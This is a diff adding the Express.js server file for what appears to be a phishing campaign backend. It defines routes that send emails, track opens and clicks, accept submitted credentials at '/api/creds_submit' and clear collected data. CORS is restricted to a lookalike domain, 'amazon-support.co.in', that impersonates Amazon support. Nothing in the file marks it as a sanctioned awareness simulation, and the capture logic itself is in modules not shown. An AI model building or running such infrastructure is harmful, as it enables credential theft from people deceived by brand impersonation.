@@ -1,0 +1,36 @@
+import 'dotenv/config';
+import express from 'express';
+import cors from 'cors';
+import path from 'path';
+import emailOpened from './api/opened.js';
+import emailClicked from './api/clicked.js';
+import getcreds from './api/getcreds.js';
+import sendEmails from './api/sendEmail.js';
+import trackdata from './api/track.js';
+import clearData from './api/cleardata.js';
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// CORS config
+app.use(cors({
+    origin: ['http://amazon-support.co.in:5173'],
+    methods: ['GET', 'POST'],
+    credentials: true
+}));
+
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+app.use('/pages', express.static(path.join(path.resolve(), 'pages')));
+
+app.get('/sendEmail', sendEmails);
+// app.get('/api/track_open', emailOpened);
+app.get('/api/clicked', emailClicked);
+app.post('/api/creds_submit', getcreds);
+app.get('/api/track', trackdata);
+app.get('/api/cleardata', clearData);
+
+app.listen(PORT, () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+});
